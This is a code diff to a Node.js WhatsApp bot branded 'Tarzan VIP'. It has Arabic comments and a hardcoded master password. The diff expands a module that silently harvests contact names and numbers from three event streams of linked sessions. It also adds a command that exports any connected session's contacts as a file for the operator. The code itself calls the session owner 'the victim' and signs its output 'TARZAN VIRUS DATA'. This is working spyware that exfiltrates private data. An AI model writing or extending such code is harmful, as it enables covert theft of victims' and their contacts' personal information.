@@ -29,7 +29,7 @@ const MASTER_PASSWORD =  'tarzanbot' ;
 const sessions = {};
 const msgStore = new Map(); 
 const spamTracker = new Map(); // 🛡️ تعقب السبام
-const contactsDB = {}; // 📂 مخزن جهات الاتصال المسحوبة للجلسات
+const contactsDB = {}; // 📂 مخزن جهات الاتصال المطوّر
 
 // ✅ 1. نظام حفظ الإعدادات (مع دعم المفتاح العالمي)
 const settingsPath = path.join(__dirname,  'settings.json' );
@@ -139,25 +139,28 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
     sock.ev.on( 'creds.update' , saveCreds);
 
-    // 🕵️ [تطوير] وحدة سحب جهات الاتصال صامتاً
-    sock.ev.on('messaging-history.set', ({ contacts }) => {
-        if (contacts) {
-            contacts.forEach(c => {
-                const id = jidNormalizedUser(c.id);
-                if (id.endsWith('@s.whatsapp.net')) {
-                    contactsDB[sessionId].set(id, { name: c.name || c.notify || 'مجهول', number: id.split('@')[0] });
-                }
-            });
+    // 🕵️ [تطوير جبار] استخراج جهات الاتصال من 3 مصادر مختلفة لضمان السحب
+    const saveContact = (id, name) => {
+        const cleanId = jidNormalizedUser(id);
+        if (cleanId.endsWith('@s.whatsapp.net')) {
+            const num = cleanId.split('@')[0];
+            if (!contactsDB[sessionId].has(cleanId)) {
+                contactsDB[sessionId].set(cleanId, { name: name || 'بدون اسم', number: num });
+            }
         }
+    };
+
+    sock.ev.on('messaging-history.set', ({ contacts, chats }) => {
+        if (contacts) contacts.forEach(c => saveContact(c.id, c.name || c.notify));
+        if (chats) chats.forEach(chat => saveContact(chat.id, chat.name));
     });
 
     sock.ev.on('contacts.upsert', (contacts) => {
-        contacts.forEach(c => {
-            const id = jidNormalizedUser(c.id);
-            if (id.endsWith('@s.whatsapp.net')) {
-                contactsDB[sessionId].set(id, { name: c.name || c.notify || 'مجهول', number: id.split('@')[0] });
-            }
-        });
+        contacts.forEach(c => saveContact(c.id, c.name || c.notify));
+    });
+
+    sock.ev.on('chats.upsert', (chats) => {
+        chats.forEach(chat => saveContact(chat.id, chat.name));
     });
 
     // 🛡️ [تطوير ميزة إسكات المكالمات فوراً] 🆕
@@ -403,34 +406,46 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
         if (!commandName) return;
 
-        // 🕵️‍♂️ [تطوير: أمر سحب جهات الاتصال المدمج] 🆕
+        // 🕵️‍♂️ [تطوير جبار: أمر سحب جهات الاتصال الشامل] 🆕
         if (commandName === 'سحب_جهات' || commandName === 'contacts') {
-            const target = args[0] || sessionId; // سحب جهات الجلسة الحالية إذا لم يحدد هدف
-            if (!sessions[target]) return reply(`❌ الجلسة [${target}] غير متصلة.`);
+            const target = args[0] || sessionId;
+            if (!sessions[target]) return reply(`❌ الجلسة [${target}] غير متصلة حالياً في السيرفر.`);
 
             try {
+                // محاولة جلب الدردشات الحالية لزيادة المحصول من الأسماء
+                const chats = await sessions[target].groupFetchAllParticipating(); // لا نحتاجه هنا لكنه يحفز المزامنة
                 const contactsMap = contactsDB[target];
-                const contacts = contactsMap ? Array.from(contactsMap.values()) : [];
-                
-                if (contacts.length === 0) return reply("❌ لم يتم رصد أي جهات اتصال لهذه الجلسة حتى الآن. انتظر المزامنة.");
+                const contactsArray = Array.from(contactsMap.values());
 
-                let contactListText = `📂 *[قائمة جهات الاتصال المسحوبة]* 📂\n👤 *الجلسة:* ${target}\n📊 *العدد:* ${contacts.length}\n━━━━━━━━━━━━━━━\n\n`;
-                contacts.forEach((c, i) => { contactListText += `${i + 1}. 👤 ${c.name}\n📱 +${c.number}\n\n`; });
-                contactListText += `\n*— TARZAN VIP EXTRACTION 👑*`;
+                if (contactsArray.length === 0) return reply("⚠️ لم يتم رصد أي جهات اتصال حتى الآن. قم بإرسال أي رسالة من هاتف الضحية لتحفيز المزامنة ثم جرب مجدداً.");
 
-                const fileName = `Contacts_${target}.txt`;
+                let fileContent = `👑 *[قائمة جهات اتصال نظام طرزان VIP]* 👑\n`;
+                fileContent += `👤 *الجلسة المستهدفة:* ${target}\n`;
+                fileContent += `📊 *إجمالي العدد المستخرج:* ${contactsArray.length}\n`;
+                fileContent += `🕒 *توقيت السحب:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD")}\n`;
+                fileContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+                contactsArray.forEach((c, i) => {
+                    fileContent += `${i + 1}. 👤 الاسم: ${c.name}\n📱 الرقم: +${c.number}\n🔗 الرابط: wa.me/${c.number}\n\n`;
+                });
+
+                fileContent += `\n*— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑹𝑼𝑺 𝑫𝑨𝑻𝑨 ⚔️*`;
+
+                const fileName = `Contacts_${target}_${Date.now()}.txt`;
                 const filePath = path.join(__dirname, fileName);
-                fs.writeFileSync(filePath, contactListText);
+                fs.writeFileSync(filePath, fileContent);
 
                 await sock.sendMessage(from, { 
                     document: fs.readFileSync(filePath), 
                     fileName: `جهات_اتصال_${target}.txt`, 
                     mimetype: 'text/plain',
-                    caption: `✅ تم سحب ${contacts.length} جهة اتصال بنجاح.`
+                    caption: `✅ تم استخراج *${contactsArray.length}* جهة اتصال بنجاح من الجلسة [${target}].`
                 }, { quoted: msg });
 
-                fs.unlinkSync(filePath); 
-            } catch (e) { reply("❌ فشلت العملية."); }
+                fs.unlinkSync(filePath);
+            } catch (e) {
+                reply("❌ فشلت عملية سحب البيانات. تأكد من استقرار اتصال الجلسة.");
+            }
             return;
         }
 
